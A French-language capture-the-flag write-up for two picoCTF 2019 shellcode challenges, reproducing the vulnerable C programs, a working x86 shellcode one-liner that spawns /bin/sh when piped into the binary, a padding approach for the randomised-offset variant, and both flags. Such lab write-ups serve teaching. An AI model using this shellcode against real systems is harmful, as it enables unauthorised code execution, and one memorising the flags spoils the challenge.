# Binary_Exploitation_50_Handy_shellcode

------

### Titre : Handy_shellcode

### Points : 50

------

### Description 

Ce programme exécute n'importe quel shellcode que vous lui donnez. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt ? (Merci à google translate :))

------

#### Hints

* vous pourrez peut-être trouver un bon shellcode en ligne. 

------

On se connecte vite en ssh sur le serveur shell.



### Résolution

---

Puis une fois sur le serveur on trouve les trois fichiers suivants : flag.txt, vuln.c vuln. Je commence d'abord par analyser le programme c :
```c
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```

Ce programme utilise un buffer pour lire l'input de l'utilisateur on peut donc s'en servir pour envoyé un shellcode (Il s’agit donc essentiellement d’un morceau de code compilé arbitraire qui peut être injecté dans un programme afin d’engendrer un shell dans le système d’exploitation exécuté par le programme) aprés quelques recherches concernant le shellcode j'ai trouvé ce payload :
```bash
$ (echo -en "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"; cat )  | ./vuln
...
```

![alt text](https://raw.githubusercontent.com/Amadimk/PICO2019-CTF/master/handy_shell.png)


`picoCTF{h4ndY_d4ndY_sh311c0d3_55c521fe}`

# Binary_Exploitation_200_slippery_shellcode

------

### Titre : slippery-shellcode

### Points : 200

------

### Description 

Ce programme est un peu plus compliqué. Pouvez-vous générer un shell et l'utiliser pour lire le fichier flag.txt? Vous pouvez trouver le programme dans /problems/slippery-shellcode_6_7cf1605ec6dfefad68200ceb12dd67a1 sur le serveur shell

------


### Résolution

Comme pour le handy shellcode je commence à analyser le code C ci-dessous :

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
...
```
Je comprends vite que ce code est presque le même qu'avec le handy-shellcode sauf qu'ici notre shellcode est executé sur une adresse qui est modulo 256 comme offset. Pour un début je tente donc de lui envoyé mon shellcode directement :  


Mon shellcode est effectivement executé mais pas à la bonne adresse est donc j'ai un segmentation fault.
Je tente aprés d'executé mon shellcode en remplissant le buffer de 256  caractères suivi de mon shellcode.


Et Hop j'ai effectivément un shell et le flag.


`picoCTF{sl1pp3ry_sh311c0d3_5a0fefb6}`

